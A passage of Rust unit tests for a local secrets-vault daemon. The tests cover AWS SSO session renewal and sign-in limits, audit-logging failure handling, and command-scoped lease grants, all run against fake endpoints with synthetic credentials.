        st.lock().unwrap().sso_profiles.get_mut("aws/x").unwrap().agent_allowed = true;
        cache_synthetic_creds(&st);
        let ep = handle(&p, &st, me, open_request(None), 0).unwrap();
        let (session, reg) = { let g = st.lock().unwrap(); (g.sso["main"].clone(), g.sso_profiles["aws/x"].clone()) };
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        handle(&p, &st, me, Req::SsoSet { session, profiles: vec![reg], limit_minutes: None }, 0).unwrap();
        assert!(st.lock().unwrap().sso_creds.is_empty());
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 404"));
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    fn ended(e: &anyhow::Error) -> &SessionEnded {
        e.downcast_ref::<SessionEnded>().unwrap_or_else(|| panic!("want SessionEnded, got {e:#}"))
    }

    fn calls(f: &Arc<Mutex<Fake>>) -> (usize, usize) {
        let f = f.lock().unwrap();
        (f.token_calls, f.creds_calls)
    }

    /// An hour-long access token with 10 s left (renewal margin is up to 2 min).
    fn expire_soon(st: &Mutex<State>) {
        let mut g = st.lock().unwrap();
        let s = g.sso.get_mut("main").unwrap();
        (s.access_issued_at, s.access_expires_at) = (now() - 3590, now() + 10);
    }

    // One test: KARAMBIT_SSO_TEST_BASE is process-wide.
    #[test]
    fn sso_sign_in_ends_cleanly_and_limits_apply() {
        let fake = Arc::new(Mutex::new(Fake::default()));
        // SAFETY: the only test in this binary that touches this variable.
        unsafe { std::env::set_var("KARAMBIT_SSO_TEST_BASE", fake_aws(fake.clone())) };
        let root = std::env::temp_dir().join(format!("karambit-daemon-test-{}", std::process::id()));
        let p = Paths { root: root.clone() };
        let me = std::process::id() as i32;

        // 1. Token about to expire: renewed in place, nothing else changes.
        let st = state_with(session("c1", 30, None));
        sso_renew(&st, &p, "main", 120, None).unwrap();
        {
            let g = st.lock().unwrap();
            let s = &g.sso["main"];
            assert_eq!((s.access_token.as_str(), s.refresh_token.as_deref()), ("AT-1", Some("RT-1")));
            assert!(s.access_expires_at > now() + 3000);
        }
        // Not due yet: no network call.
        sso_renew(&st, &p, "main", 120, None).unwrap();
        assert_eq!(calls(&fake).0, 1);

        // 2. AWS outage (500): kept signed in, error remembered, retried later.
        fake.lock().unwrap().token.push_back((500, r#"{"error":"InternalServerException"}"#));
        expire_soon(&st);
        let e = sso_renew(&st, &p, "main", 120, None).unwrap_err();
        assert!(e.downcast_ref::<SessionEnded>().is_none(), "a 500 must not end the sign-in: {e:#}");
        assert!(st.lock().unwrap().sso.contains_key("main"));
        assert!(st.lock().unwrap().sso_trouble.contains_key("main"));
        sso_renew(&st, &p, "main", 120, None).unwrap();
        assert!(st.lock().unwrap().sso_trouble.is_empty(), "trouble cleared after a good renewal");

        // 3. AWS refuses to renew (the Identity Center session ended): signed out, and
        //    status + agents say why instead of "signed in".
        let (fresh, _) = sso_fresh_creds(&st, &p, "aws/x").map(|(c, e, l)| ((c, e), l)).unwrap();
        assert_eq!(fresh.0.access_key_id, "ASIAFAKEFAKEFAKE");
        assert!(st.lock().unwrap().sso_creds.contains_key("aws/x"));
        fake.lock().unwrap().token.push_back((400, r#"{"error":"invalid_grant","error_description":"Invalid refresh token provided"}"#));
        expire_soon(&st);
        let e = sso_renew(&st, &p, "main", 120, None).unwrap_err();
        assert!(!ended(&e).limit && ended(&e).why.contains("invalid_grant"), "{e:#}");
        {
            let g = st.lock().unwrap();
            assert!(g.sso.is_empty(), "ended sign-in must leave the daemon (status, reaper)");
            assert!(g.sso_creds.is_empty(), "cached role credentials dropped");
            assert!(g.sso_profiles.contains_key("aws/x"), "profile kept so agents are told why");
        }
        let e = sso_fresh_creds(&st, &p, "aws/x").unwrap_err();
        assert!(ended(&e).why.contains("invalid_grant"), "agents get the reason: {e:#}");
        let v = handle(&p, &st, me, Req::SsoStatus, 0).unwrap();
        assert_eq!(v["logged_in"], json!(false));
        assert_eq!(v["profiles"], json!([]), "no profile listed as usable");
        assert!(v["ended"]["main"]["why"].as_str().unwrap().contains("invalid_grant"));
        assert_eq!(v["ended"]["main"]["limit"], json!(false));
        let audit = std::fs::read_to_string(p.audit()).unwrap();
        assert!(audit.contains(r#""action":"sso-ended""#) && audit.contains(r#""aws/x""#), "logged with its profiles");

        // 4. Sign-in limit passed: ends without any AWS call, even with cached creds.
        let st = state_with(session("c2", 3000, Some(now() + 3600)));
        sso_fresh_creds(&st, &p, "aws/x").unwrap();
        let before = calls(&fake);
        st.lock().unwrap().sso.get_mut("main").unwrap().renew_until = Some(now() - 1);
        assert_eq!(sso_due(&st.lock().unwrap(), now(), &HashMap::from([("main".to_string(), now() + 999)])), vec!["main"]);
        let e = sso_fresh_creds(&st, &p, "aws/x").unwrap_err();
        assert!(ended(&e).limit, "{e:#}");
        assert_eq!(calls(&fake), before, "no AWS call past the limit");
        assert!(st.lock().unwrap().sso.is_empty());
        assert_eq!(handle(&p, &st, me, Req::SsoStatus, 0).unwrap()["ended"]["main"]["limit"], json!(true));

        // 5. Keeper scheduling: due near expiry, unless a retry after trouble isn't due.
        let st = state_with(session("c3", 30, None));
        assert_eq!(sso_due(&st.lock().unwrap(), now(), &HashMap::new()), vec!["main"]);
        assert!(sso_due(&st.lock().unwrap(), now(), &HashMap::from([("main".to_string(), now() + 60)])).is_empty());
        st.lock().unwrap().sso.get_mut("main").unwrap().access_expires_at = now() + 3000;
        assert!(sso_due(&st.lock().unwrap(), now(), &HashMap::new()).is_empty());

        // 6. Changing the limit of a live sign-in (signed in 10 min ago).
        let asked = std::cell::Cell::new(0);
        let yes = |_: &Prompt| {
            asked.set(asked.get() + 1);
            Ok(())
        };
        let at = st.lock().unwrap().sso["main"].signed_in_at;
        let v = sso_set_limit(&st, &p, "main", Some(480), yes).unwrap();
        assert_eq!((v["asked"].clone(), v["ended"].clone(), asked.get()), (json!(false), json!(false), 0), "adding a limit tightens: no prompt");
        assert_eq!(st.lock().unwrap().sso["main"].renew_until, Some(at + 480 * 60), "counted from sign-in");
        sso_set_limit(&st, &p, "main", Some(60), yes).unwrap();
        assert_eq!(asked.get(), 0, "shorter: no prompt");
        let e = sso_set_limit(&st, &p, "main", Some(720), |_: &Prompt| bail!("Touch ID cancelled")).unwrap_err();
        assert!(e.to_string().contains("cancelled"));
        assert_eq!(st.lock().unwrap().sso["main"].renew_until, Some(at + 3600), "refused lengthening changes nothing");
        let v = sso_set_limit(&st, &p, "main", None, yes).unwrap();
        assert_eq!((v["asked"].clone(), asked.get()), (json!(true), 1), "removing the limit asks");
        assert_eq!(st.lock().unwrap().sso["main"].renew_until, None);
        let v = sso_set_limit(&st, &p, "main", Some(15), yes).unwrap();
        assert_eq!(v["ended"], json!(false), "15 min limit, signed in 10 min ago: still on");
        st.lock().unwrap().sso.get_mut("main").unwrap().signed_in_at = now() - 3600;
        let v = sso_set_limit(&st, &p, "main", Some(30), yes).unwrap();
        assert_eq!(v["ended"], json!(true), "a limit already passed signs out now");
        assert!(st.lock().unwrap().sso.is_empty());
        assert_eq!(sso_set_limit(&st, &p, "main", Some(60), yes).unwrap()["session"], json!(false));

        // 7. AWS rejects the access token: renewed once and retried; rejected again
        //    right after renewing, the sign-in is over.
        let st = state_with(session("c4", 3000, None));
        let (t0, c0) = calls(&fake);
        fake.lock().unwrap().creds.push_back(401);
        sso_fresh_creds(&st, &p, "aws/x").unwrap();
        assert_eq!(calls(&fake), (t0 + 1, c0 + 2));
        st.lock().unwrap().sso_creds.clear();
        fake.lock().unwrap().creds.extend([401, 401]);
        let e = sso_fresh_creds(&st, &p, "aws/x").unwrap_err();
        assert!(ended(&e).why.contains("rejected"), "{e:#}");
        assert!(st.lock().unwrap().sso.is_empty());

        // 8. A sign-in that ends must never sign out the one that replaced it.
        let st = state_with(session("new", 3000, None));
        let old = session("old", 3000, None);
        end_sso(&st, &p, &old, 0, &old.ended("test"));
        assert!(st.lock().unwrap().sso.contains_key("main"));
        assert!(st.lock().unwrap().sso_ended.is_empty());

        // 9. An in-flight AWS result cannot commit cache/return under a replacement
        // registration or a new sign-in, even if AWS/client ID and profile are identical.
        for replace_session in [false, true] {
            let st = Arc::new(state_with(session("same-id", 3600, None)));
            let state = st.clone();
            SSO_TEST_HOOK.with(|h| *h.borrow_mut() = Some(("creds-commit", Box::new(move || {
                let mut g = state.try_lock().expect("no state mutex across acquisition");
                if replace_session { g.invalidate_session("main"); } else { g.invalidate_registration("aws/x"); }
            }))));
            let before = calls(&fake).1;
            assert!(sso_fresh_creds(&st, &p, "aws/x").unwrap_err().to_string().contains("changed; retry"));
            assert_eq!(calls(&fake).1, before + 1, "real loopback acquisition precedes the rejected commit");
            assert!(st.lock().unwrap().sso_creds.is_empty());
            let stale = st.lock().unwrap().binding("aws/x").unwrap();
            st.lock().unwrap().invalidate_registration("aws/x");
            let before = calls(&fake);
            assert!(sso_fresh_creds_bound(&st, &p, "aws/x", &stale).is_err());
            assert_eq!(calls(&fake), before, "stale proof rejected before network/cache");
        }
        clear_hooks();
        unsafe { std::env::remove_var("KARAMBIT_SSO_TEST_BASE") };
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn portal_limit_uses_persisted_config_under_audit_failure() {
        install_unlock_test_dispatch();
        use crate::{audit, Karambit};
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-limit-stale-{}", std::process::id())) };
        let mut cfg = store::Config::default();
        cfg.sso_portals.insert("main".into(), store::SsoPortal {
            start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into(), limit_minutes: Some(60), accounts: Default::default() });
        store::save_config(&p, &cfg).unwrap();
        let instance = || Karambit { paths: p.clone(), cfg: cfg.clone(), caller: Default::default(), run_cmd: None };
        let mut a = instance();
        let mut b = instance();
        a.sso_portal_limit("main", Some(15)).unwrap();
        let mut current = store::load_config(&p).unwrap();
        current.sso_portals.get_mut("main").unwrap().region = "us-west-2".into();
        store::save_config(&p, &current).unwrap();
        audit::fail_phase(Some("all"));
        let error = b.sso_portal_limit("main", Some(30)).unwrap_err();
        assert!(format!("{error:#}").contains("audit intent"));
        assert_eq!(store::load_config(&p).unwrap().sso_portals["main"].limit_minutes, Some(15));
        current.sso_portals.get_mut("main").unwrap().limit_minutes = Some(20);
        store::save_config(&p, &current).unwrap();
        b.sso_portal_limit("main", Some(15)).unwrap();
        let current = store::load_config(&p).unwrap();
        assert_eq!(current.sso_portals["main"].limit_minutes, Some(15));
        assert_eq!(current.sso_portals["main"].region, "us-west-2");
        audit::fail_phase(None);
        std::fs::remove_dir_all(&p.root).unwrap();
    }

    #[test]
    fn portal_limit_shortening_completes_while_unrelated_auth_is_paused() {
        use crate::{audit, helper, Karambit};
        use std::sync::mpsc;
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-limit-concurrent-{}", std::process::id())) };
        let mut cfg = store::Config::default();
        for name in ["a", "b"] {
            cfg.sso_portals.insert(name.into(), store::SsoPortal {
                start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into(), limit_minutes: Some(60), accounts: Default::default() });
        }
        store::save_config(&p, &cfg).unwrap();
        let mut a = Karambit { paths: p.clone(), cfg: cfg.clone(), caller: Default::default(), run_cmd: None };
        let mut b = Karambit { paths: p.clone(), cfg, caller: Default::default(), run_cmd: None };
        let (paused_tx, paused_rx) = mpsc::channel();
        let (resume_tx, resume_rx) = mpsc::channel();
        let a_thread = std::thread::spawn(move || {
            install_unlock_test_dispatch();
            helper::AUTH_HOOK.with(|hook| *hook.borrow_mut() = Some(Box::new(move || {
                paused_tx.send(()).unwrap();
                resume_rx.recv().unwrap();
                Ok(())
            })));
            a.sso_portal_limit("a", Some(90))
        });
        paused_rx.recv_timeout(Duration::from_secs(5)).unwrap();
        let (done_tx, done_rx) = mpsc::channel();
        let b_thread = std::thread::spawn(move || {
            install_unlock_test_dispatch();
            audit::fail_phase(Some("all"));
            let result = b.sso_portal_limit("b", Some(15));
            audit::fail_phase(None);
            done_tx.send(result).unwrap();
        });
        let completed = done_rx.recv_timeout(Duration::from_secs(5));
        // Capture persistence before resuming A, but always unblock A on a regression.
        let before_resume = store::load_config(&p).unwrap();
        resume_tx.send(()).unwrap();
        a_thread.join().unwrap().unwrap();
        b_thread.join().unwrap();
        completed.expect("containment waited on unrelated authentication").unwrap();
        assert_eq!(before_resume.sso_portals["a"].limit_minutes, Some(60));
        assert_eq!(before_resume.sso_portals["b"].limit_minutes, Some(15));
        let current = store::load_config(&p).unwrap();
        assert_eq!(current.sso_portals["a"].limit_minutes, Some(90));
        assert_eq!(current.sso_portals["b"].limit_minutes, Some(15));
        audit::verify(&p).unwrap();
        std::fs::remove_dir_all(&p.root).unwrap();
    }

    #[test]
    fn portal_limit_reclassifies_once_before_commit() {
        install_unlock_test_dispatch();
        use crate::{audit, helper, Karambit, BEFORE_LIMIT_COMMIT};
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-limit-reclassify-{}", std::process::id())) };
        // Includes skipped-auth containment becoming lengthening/equal, and
        // authenticated lengthening racing with a different persisted value.
        for (requested, intervening, allowed) in [(30, 45, true), (30, 15, false), (30, 30, false), (90, 120, true), (90, 75, false)] {
            let mut cfg = store::Config::default();
            cfg.sso_portals.insert("a".into(), store::SsoPortal {
                start_url: "https://example.awsapps.com/start".into(), region: "us-east-1".into(), limit_minutes: Some(60), accounts: Default::default() });
            store::save_config(&p, &cfg).unwrap();
            let mut a = Karambit { paths: p.clone(), cfg, caller: Default::default(), run_cmd: None };
            let changed_paths = p.clone();
            BEFORE_LIMIT_COMMIT.with(|hook| *hook.borrow_mut() = Some(Box::new(move || {
                let lock = store::lock_config(&changed_paths).unwrap();
                let mut cfg = lock.load().unwrap();
                let portal = cfg.sso_portals.get_mut("a").unwrap();
                portal.limit_minutes = Some(intervening);
                portal.region = "us-west-2".into();
                lock.save(&cfg).unwrap();
            })));
            if requested > 60 {
                helper::AUTH_HOOK.with(|hook| *hook.borrow_mut() = Some(Box::new(|| Ok(()))));
            } else {
                audit::fail_phase(Some("all"));
            }
            let result = a.sso_portal_limit("a", Some(requested));
            audit::fail_phase(None);
            if allowed { result.unwrap(); } else {
                assert!(format!("{:#}", result.unwrap_err()).contains("config changed, retry"));
            }
            let current = store::load_config(&p).unwrap();
            assert_eq!(current.sso_portals["a"].limit_minutes, Some(if allowed { requested } else { intervening }));
            assert_eq!(current.sso_portals["a"].region, "us-west-2");
        }
        std::fs::remove_dir_all(&p.root).unwrap();
    }

    #[test]
    fn raw_response_delivery_precedes_outcome_and_records_write_failure() {
        struct Writer<'a> { paths: &'a Paths, fail: bool, bytes: Vec<u8> }
        impl Write for Writer<'_> {
            fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
                let events = crate::audit::read(self.paths, usize::MAX).unwrap();
                assert_eq!(events.last().unwrap()["phase"], "intent", "outcome must follow socket write");
                if self.fail { return Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, "synthetic delivery failure")); }
                self.bytes.extend_from_slice(bytes);
                Ok(bytes.len())
            }
            fn flush(&mut self) -> std::io::Result<()> { Ok(()) }
        }
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-delivery-{}", std::process::id())) };
        let cfg = store::Config {
            agent_process_names: vec![], agent_env_markers: vec![],
            removed_defaults: store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| s.to_string()).collect(),
            ..Default::default()
        };
        store::save_config(&p, &cfg).unwrap();
        let st = state_with(session("audit", 30, None));
        for fail in [false, true] {
            let mut writer = Writer { paths: &p, fail, bytes: vec![] };
            let result = handle_correlated(&p, &st, std::process::id() as i32, Req::Use { names: vec![], cmd: None }, 0, Some("untrusted"), |response| {
                write_response(&mut writer, &response)?;
                Ok(response)
            });
            assert_eq!(result.is_err(), fail);
            let events = crate::audit::read(&p, usize::MAX).unwrap();
            let outcome = events.last().unwrap();
            assert_eq!(outcome["phase"], "outcome");
            assert_eq!(outcome["ok"], !fail);
            if fail { assert!(outcome["err"].as_str().unwrap().contains("synthetic delivery failure")); }
            else { assert_eq!(writer.bytes, b"{\"deks\":{},\"denied\":{}}\n"); }
        }
        assert_eq!(crate::audit::verify(&p).unwrap(), (4, None));
        std::fs::remove_dir_all(&p.root).unwrap();
    }

    #[test]
    fn audit_failure_refuses_nonexempt_entrypoints() {
        use crate::{audit, Karambit};
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-audit-refuse-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
        let st = state_with(session("audit", 30, Some(now() + 3600)));
        let me = std::process::id() as i32;
        let cfg = store::Config {
            agent_process_names: vec![], agent_env_markers: vec![],
            removed_defaults: store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| s.to_string()).collect(),
            ..Default::default()
        };
        store::save_config(&p, &cfg).unwrap();
        handle(&p, &st, me, Req::Grant { leases: vec![GrantItem {
            name: "v1/open".into(), dek: B64.encode([0u8; 32]), to: Grantee::Human,
            root: None, expires: now() + 300, scope: Scope::default(), by: "synthetic".into(),
        }] }, 0).unwrap_err();
        let before_config = std::fs::read(p.config()).unwrap();
        audit::fail_phase(Some("all"));
        for req in [
            Req::Grant { leases: vec![] }, Req::Use { names: vec!["v1/open".into()], cmd: None },
            Req::AwsOpen { profile: "test".into(), creds: "synthetic".into(), ttl: 60 },
            Req::SsoOpen { name: "aws/x".into(), dek: None, ttl: 60 },
            Req::SsoRegister { profiles: vec![] },
            Req::SsoSet { session: session("replacement", 30, None), profiles: vec![], limit_minutes: None },
        ] {
            let err = handle_correlated(&p, &st, me, req, 0, Some("forged-intent"), Ok).unwrap_err();
            assert!(format!("{err:#}").contains("audit intent"));
        }
        assert!(st.lock().unwrap().aws.is_empty());
        assert!(st.lock().unwrap().human.is_empty());
        assert_eq!(st.lock().unwrap().sso["main"].client_id, "audit");
        assert!(sso_renew(&st, &p, "main", 120, None).is_err());
        assert!(sso_fresh_creds(&st, &p, "aws/x").is_err());
        assert!(sso_set_limit(&st, &p, "main", None, |_| panic!("must not authenticate")).is_err());
        let mut v = Karambit { paths: p.clone(), cfg: store::Config::default(), caller: Default::default(), run_cmd: None };
        assert!(v.init(None).is_err());
        assert!(!p.keys().exists());
        assert_eq!(std::fs::read(p.config()).unwrap(), before_config);
        store::ensure_dir(&p.keys()).unwrap();
        for k in ["bio.key", "open.key"] { std::fs::write(p.keys().join(k), b"synthetic marker").unwrap(); }
        let fixture = Paths { root: std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures") };
        let f = store::load_secret(&fixture, "v1/open").unwrap();
        store::save_secret(&p, &f).unwrap();
        let before = std::fs::read(p.secret(&f.name).unwrap()).unwrap();
        let names = [f.name.clone()];
        let (identity, recipient) = crate::crypto::generate_backup_identity();
        install_unlock_test_dispatch();
        for result in [
            v.add(&f.name, b"synthetic replacement", Some(store::Tier::Open), true, false, true).map(|_| ()),
            v.unlock("run", &names, None, false).map(|_| ()),
            v.upgrade_keys().map(|_| ()),
            v.retire_keys().map(|_| ()),
            v.recover(&identity).map(|_| ()),
            v.rotate_backup(&recipient).map(|_| ()),
            v.set_policy(&names, Some(store::Tier::Bio), None, None).map(|_| ()),
            v.remove(&names).map(|_| ()),
            v.grant_lease(&names, &Grantee::Human, 1.0, &Scope::default()).map(|_| ()),
            v.set_config("clip-seconds", "40"),
            v.sso_portal_add("test", "https://example.awsapps.com/start", "us-east-1"),
        ] {
            assert!(format!("{:#}", result.unwrap_err()).contains("audit intent"));
        }
        REQUEST_HOOK.with(|h| h.borrow_mut().take());
        assert_eq!(std::fs::read(p.secret(&f.name).unwrap()).unwrap(), before);
        assert_eq!(std::fs::read(p.config()).unwrap(), before_config);
        // HTTP, including fixed/cached endpoints, refuses before writing any response.
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let mut client = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
        let (server, _) = listener.accept().unwrap();
        assert!(serve_aws(server, &st, &p).is_err());
        let mut bytes = vec![];
        client.read_to_end(&mut bytes).unwrap();
        assert!(bytes.is_empty());
        audit::fail_phase(None);
        std::fs::remove_dir_all(&p.root).unwrap();
    }

    #[test]
    fn audit_failure_and_lock_contention_never_block_containment() {
        use crate::audit;
        use std::os::fd::AsRawFd;
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-audit-contain-{}", std::process::id())) };
        store::ensure_dir(&p.root).unwrap();
        let cfg = store::Config {
            agent_process_names: vec![], agent_env_markers: vec![],
            removed_defaults: store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| s.to_string()).collect(),
            ..Default::default()
        };
        store::save_config(&p, &cfg).unwrap();
        let st = state_with(session("audit", 3000, None));
        let me = std::process::id() as i32;
        let lock = std::fs::OpenOptions::new().create(true).append(true).open(p.audit()).unwrap();
        assert_eq!(unsafe { libc::flock(lock.as_raw_fd(), libc::LOCK_EX | libc::LOCK_NB) }, 0);
        // Lock contention (rather than the injection) must also return immediately.
        handle(&p, &st, me, Req::Revoke { patterns: vec!["*".into()] }, 0).unwrap();
        audit::fail_phase(Some("all"));
        let result = sso_set_limit(&st, &p, "main", Some(15), |_| panic!("shortening must not authenticate")).unwrap();
        assert_eq!(result["asked"], false);
        handle(&p, &st, me, Req::AwsClose { id: "missing".into() }, 0).unwrap();
        handle(&p, &st, me, Req::SsoForget { names: vec!["aws/x".into()] }, 0).unwrap();
        assert!(st.lock().unwrap().sso_profiles.is_empty());
        handle(&p, &st, me, Req::SsoLogout { portal: None }, 0).unwrap();
        assert!(st.lock().unwrap().sso.is_empty());
        audit::fail_phase(None);
        drop(lock);
        std::fs::remove_dir_all(&p.root).unwrap();
    }

}

#[cfg(test)]
mod lease_proof_tests {
    use super::*;
    use crate::{audit, helper, crypto, Karambit};
    use std::{cell::Cell, rc::Rc};

    fn software_ecdh(calls: Rc<Cell<usize>>) {
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |reqs| {
            calls.set(calls.get() + 1);
            let sk = p256::SecretKey::from_slice(&[7; 32]).unwrap();
            reqs.iter().map(|(_, eph)| {
                let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
            }).collect()
        })));
    }
    fn unlocked_screen() {
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|reqs| {
            assert_eq!(reqs[0].0, store::KeyId::Open);
            Ok(vec![])
        })));
    }
    fn peer(anchor: Option<(i32, u64)>) -> agent::Peer {
        agent::Peer { pid: 99, anchor, ancestors: anchor.into_iter().collect(), ..Default::default() }
    }
    #[test]
    fn daemon_proves_grants_and_binds_human_cache() {
        use p256::elliptic_curve::sec1::ToEncodedPoint;
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-lease-proof-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
        store::ensure_dir(&p.keys()).unwrap();
        let cfg = store::Config { removed_defaults: store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| s.to_string()).collect(), ..Default::default() };
        store::save_config(&p, &cfg).unwrap();
        let pk = B64.encode(p256::SecretKey::from_slice(&[7; 32]).unwrap().public_key().to_encoded_point(false).as_bytes());
        store::write_atomic(&p.pubkeys(), &serde_json::to_vec(&json!({"bio": pk, "open": pk})).unwrap()).unwrap();
        let v = Karambit { paths: p.clone(), cfg, caller: Default::default(), run_cmd: None };
        for (name, tier) in [("test/bio", store::Tier::Bio), ("test/open", store::Tier::Open)] {
            let f = v.build_file(name, tier, false, false, &crypto::new_dek(), b"synthetic lease proof", &v.pubkeys_local().unwrap(), None).unwrap();
            store::save_secret(&p, &f).unwrap();
        }
        let st = Ctx::new(State::default());
        let raw = Req::Grant { leases: vec![GrantItem { name: "test/bio".into(), dek: B64.encode([1; 32]), to: Grantee::Human, root: None, expires: u64::MAX, scope: Scope::default(), by: "forged".into() }] };
        assert!(handle(&p, &st, std::process::id() as i32, raw, 0).unwrap_err().to_string().contains("client-supplied"));
        assert!(st.lock().unwrap().human.is_empty());
        let grant = || Req::GrantLease { names: vec!["test/open".into()], grantee: Grantee::Any, hours: 1.0, scope: Scope { cmds: vec!["/usr/bin/true".into()], ..Scope::default() } };
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| bail!("synthetic auth refused"))));
        assert!(handle(&p, &st, std::process::id() as i32, grant(), 0).unwrap_err().to_string().contains("auth refused"));
        assert!(st.lock().unwrap().leases.is_empty());
        let calls = Rc::new(Cell::new(0));
        software_ecdh(calls.clone());
        helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        audit::fail_phase(Some("intent"));
        assert!(handle(&p, &st, std::process::id() as i32, grant(), 0).is_err());
        assert!(handle(&p, &st, std::process::id() as i32, Req::HumanUnlock { names: vec!["test/bio".into()] }, 0).is_err());
        audit::fail_phase(None);
        assert_eq!(calls.get(), 0);
        handle(&p, &st, std::process::id() as i32, grant(), 0).unwrap();
        assert_eq!(calls.get(), 1);
        assert!(st.lock().unwrap().leases["test/open"].info.by.starts_with("peer pid:"));
        assert!(matches!(st.lock().unwrap().leases["test/open"].scope.cmds[0], CommandBinding::Pinned { .. }));
        let agent = agent::Peer { caller: agent::Caller { agent: Some("synthetic".into()), ..Default::default() }, ..Default::default() };
        for (command, allowed) in [(Some("/usr/bin/true"), false), (Some("/bin/echo"), false), (None, false)] {
            let response = handle_effect(&p, &st, agent.clone(), Req::Use { names: vec!["test/open".into()], cmd: command.map(str::to_owned) }, 0).unwrap();
            assert_eq!(response["deks"]["test/open"].is_string(), allowed);
        }
        st.lock().unwrap().leases.get_mut("test/open").unwrap().scope.cmds = vec!["true".into()];
        let response = handle_effect(&p, &st, agent, Req::Use { names: vec!["test/open".into()], cmd: Some("/usr/bin/true".into()) }, 0).unwrap();
        assert!(response["deks"]["test/open"].is_null());
        assert!(response["denied"]["test/open"].as_str().unwrap().contains("karambit run"));

        software_ecdh(calls.clone());
        let unlock = || Req::HumanUnlock { names: vec!["test/bio".into()] };
        let result = handle_effect(&p, &st, peer(Some((10, 20))), unlock(), 0).unwrap();
        assert!(result["deks"]["test/bio"].is_string());
        assert_eq!(calls.get(), 2, "one Bio ECDH batch seeds cache, no auth double prompt");
        assert_eq!(st.lock().unwrap().human.len(), 1);
        for (anchor, hit) in [(Some((10, 20)), true), (Some((11, 20)), false), (None, false), (Some((10, 21)), false)] {
            unlocked_screen();
            let r = handle_effect(&p, &st, peer(anchor), Req::Use { names: vec!["test/bio".into()], cmd: None }, 0).unwrap();
            assert_eq!(r["deks"]["test/bio"].is_string(), hit);
        }
        unlocked_screen();
        let mut unknown_env = peer(Some((10, 20)));
        unknown_env.caller.env_unknown = true;
        let r = handle_effect(&p, &st, unknown_env, Req::Use { names: vec!["test/bio".into()], cmd: None }, 0).unwrap();
        assert!(r["deks"]["test/bio"].is_null(), "unavailable environment cannot reuse an otherwise matching anchor");
        software_ecdh(calls.clone());
        handle_effect(&p, &st, peer(None), unlock(), 0).unwrap();
        assert_eq!(calls.get(), 3);
        assert_eq!(st.lock().unwrap().human.len(), 1, "unanchored unwrap never creates cache");
        helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|_| bail!("screen locked"))));
        let r = handle_effect(&p, &st, peer(Some((10, 20))), Req::Use { names: vec!["test/bio".into()], cmd: None }, 0).unwrap();
        assert!(r["deks"]["test/bio"].is_null());
        assert!(st.lock().unwrap().human.is_empty());
        for key in ["bio.key", "open.key"] { std::fs::write(p.keys().join(key), b"synthetic").unwrap(); }
        // Exercise library routing, not just the raw daemon operation.
        let f = v.build_file("test/enabled", store::Tier::Bio, true, false, &crypto::new_dek(), b"synthetic", &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&p, &f).unwrap();
        let state = Rc::new(Ctx::new(State::default()));
        let server = state.clone();
        REQUEST_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |p, req| {
            let req = serde_json::from_value(serde_json::to_value(req)?)?;
            handle_as(p, &server, peer(Some((10, 20))), req, 0, None, Ok)
        })));
        software_ecdh(calls.clone());
        let before = calls.get();
        crate::BEFORE_ACTION.with(|h| *h.borrow_mut() = Some(Box::new(|| audit::fail_phase(Some("intent")))));
        let refused = v.unlock("run", &["test/bio".into(), "test/enabled".into()], None, false).err().unwrap();
        assert!(format!("{refused:#}").contains("injected audit append failure"), "{refused:#}");
        audit::fail_phase(None);
        assert_eq!(calls.get(), before, "action intent failure must precede fresh ECDH");
        assert!(state.lock().unwrap().human.is_empty());
        let events = audit::read(&p, usize::MAX).unwrap();
        assert!(events.iter().any(|e| e["action"] == "unlock-operation" && e["phase"] == "intent"));
        assert_eq!(v.unlock("run", &["test/bio".into(), "test/enabled".into()], None, false).unwrap().len(), 2);
        assert_eq!(calls.get(), before + 1, "mixed uncached Bio batch must unwrap once");
        let g = state.lock().unwrap();
        assert_eq!(g.human.len(), 1);
        assert!(g.human.contains_key(&(10, 20, "test/bio".into())));
        drop(g);
        REQUEST_HOOK.with(|h| h.borrow_mut().take());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    /// Vault with software keys and one Bio + one Open secret per given name.
    fn grant_fixture(label: &str, names: &[String]) -> (Paths, Ctx) {
        use p256::elliptic_curve::sec1::ToEncodedPoint;
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-{label}-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
